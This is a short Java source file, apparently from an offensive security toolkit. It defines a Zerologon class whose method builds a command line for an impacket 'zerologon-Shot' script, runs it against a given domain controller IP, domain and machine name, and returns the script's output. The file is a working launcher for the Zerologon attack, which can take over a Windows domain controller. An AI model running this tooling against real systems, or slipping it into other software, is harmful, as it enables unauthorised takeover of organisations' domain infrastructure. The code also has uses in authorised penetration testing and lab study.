package utils;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Zerologon {
    public static String  zerologon = "impacket/examples/zerologon-Shot/zerologon-Shot.py";

    public static String ZerologonExec(String Dc_ip, String Domain, String DomainMachineName, String encoder) {
        StringBuilder output = new StringBuilder();
        try {
            String[] commandArgs = {"python", zerologon, Domain + "/" + "'" + DomainMachineName + "'" + "@" + Dc_ip, "-dc-ip", Dc_ip};
            String command = String.join(" ", commandArgs); // 将命令参数拼接成字符串
            System.out.println("Command: " + command); // 打印执行的命令
            Process process = Runtime.getRuntime().exec(commandArgs);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), encoder));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.equals("")) {
                    continue; // 跳过空行
                }
                output.append(line).append("\n");
            }

            int exitCode = process.waitFor();
            System.out.println("Exit Code: " + exitCode);
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
        return output.toString();
    }

}
